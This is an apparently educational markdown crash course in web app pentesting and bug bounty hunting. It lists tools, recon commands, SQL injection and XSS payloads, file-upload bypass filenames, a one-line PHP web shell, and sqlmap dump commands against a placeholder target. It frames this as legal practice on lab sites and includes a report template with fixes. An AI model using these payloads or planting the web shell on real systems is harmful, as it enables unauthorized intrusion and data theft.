# 🛡️ 24-Hour Ethical Hacking & Web App Pentesting Crash Course

Cut the fluff. Here's your high-ROI, battle-tested roadmap to go from zero to dangerous in **web application security and ethical hacking** — fast.

---

## ⚙️ PHASE 1: Setup & Mindset (1 Hour Max)

### ✅ Essential Tools

- **OS**: Kali Linux or Parrot OS
- **Browser**: Firefox + Extensions:
  - HackBar
  - FoxyProxy
- **Proxy**: [Burp Suite Community](https://portswigger.net/burp)
- **Recon Tools**: `nmap`, `ffuf`, `dirsearch`, `assetfinder`, `httpx`
- **Exploitation Tools**: `sqlmap`, `wfuzz`, `XSStrike`
- **Labs for Practice**:
  - [Hack The Box](https://hackthebox.com)
  - [TryHackMe](https://tryhackme.com)
  - [PortSwigger Web Security Academy](https://portswigger.net/web-security)

---

## 🕵️ PHASE 2: Recon & Enumeration (2 Hours)

### 🔍 Recon Workflow

```bash
# Subdomain Enumeration
assetfinder --subs-only target.com

# Port Scan
nmap -sC -sV -T4 -p- target.com

# Directory Discovery
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Live Hosts
subfinder -d target.com | httpx -status-code -title
```

> 💡 **Objective:** Map out the attack surface – subdomains, ports, directories, parameters.

---

## 💥 PHASE 3: Common Web App Attacks (5–6 Hours)

### 🔓 SQL Injection (SQLi)

#### 🔧 Manual Testing
```sql
' OR '1'='1
" OR 1=1--
admin'--
```

#### 🚀 Automated
```bash
sqlmap -u "https://target.com/page.php?id=1" --batch --dump
```

---

### 🔥 Cross-Site Scripting (XSS)

#### 🧪 Payloads
```html
<script>alert(1)</script>
"><script>alert(1)</script>
<img src=x onerror=alert(1)>
```

#### 🛠 Tool
```bash
xsstrike -u "https://target.com/search?q=test"
```

---

### 📁 File Upload Vulnerabilities

#### ✅ Bypass Techniques
```
shell.php.jpg
image.php%00.jpg
shell.pHp
```

#### 🔥 PHP Web Shell
```php
<?php echo shell_exec($_GET['cmd']); ?>
```

---

### 🔐 Authentication Bypass

#### 📌 Try These:
```
' OR 1=1 --
admin' --
```

> Use Burp Suite to manipulate request body, headers, and cookies.

---

### 🏑 Insecure Direct Object Reference (IDOR)

#### 🔎 Test:
- Change `/user/1002` → `/user/1`
- Replay requests with different IDs
- Edit JWTs or cookies manually

---

## ⚡ PHASE 4: Automation & Shortcuts (3 Hours)

### 🚀 Scripted Recon

```bash
# Subdomain & Live Check
subfinder -d target.com | httpx -status-code -title

# Directory Bruteforce
ffuf -w /usr/share/wordlists/dirb/common.txt -u https://target.com/FUZZ -mc 200

# Port Scanning
nmap -sC -sV -T4 -p- target.com
```

### ↺ Burp Suite Workflow

- **Proxy**: Capture requests
- **Repeater**: Modify & resend
- **Intruder**: Fuzz parameters
- **Logger++**: Track injections
- **Extensions**: Add things like Autorize, ActiveScan++

---

## 🧪 PHASE 5: Bug Bounty Focus (3 Hours)

### 🎯 High-Value Vulns

- IDOR (Access Control Bypass)
- SSRF via image upload or URL fetch
- Open Redirects
- Subdomain Takeovers
- Misconfigured CORS
- Rate Limiting bypass

### 🧠 Real World Strategy

1. Find a juicy endpoint (e.g. `/api/upload`, `/account/123`)
2. Tamper everything: headers, body, cookies, params
3. Automate recon, **manually test logic**

---

### 🛠 Top Resources

- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [Bug Bounty Reports](https://hackerone.com/hacktivity)
- [Bug Bounty Notes](https://bugbountyhunter.com/notes/)
- [HackTricks](https://book.hacktricks.xyz/)

---

## 🧪 PHASE 6: Practice Smarter (4–5 Hours)

### 💻 Do These:

- PortSwigger Labs (focus: SQLi, XSS, IDOR, Auth)
- 2–3 retired Hack The Box or TryHackMe web boxes
- Practice building exploit chains (e.g. XSS → cookie theft → admin access)

---

## 🧠 Mental Models

- What user input do I control?
- Where does my input show up in the response?
- What assumptions does the app make about identity/auth?
- How can I bypass validation or escalate privilege?

---

## 📋 Vulnerability Report Template

```markdown
# [Vulnerability Title]

**Target:** https://target.com/page  
**Severity:** High

---

## 📖 Description
Explain the issue in plain English.

---

## ✅ Steps to Reproduce
1. Go to https://target.com/login
2. Enter `' OR 1=1--` in the username field
3. Log in as admin

---

## 💨 Impact
Attacker can bypass authentication and gain unauthorized access.

---

## 🛠 Recommended Fix
- Use parameterized queries
- Sanitize input
- Implement server-side validation
```

---

## 💡 Final Advice

- Think like a **curious attacker**, not a scanner.
- Automate recon, but **manually explore logic flaws**.
- Track your payloads, note responses, and always try to **chain vulnerabilities**.
- **Report ethically** and document clearly.

> 🧠 Stay legal. Stay sharp. Stay dangerous (in a good way).
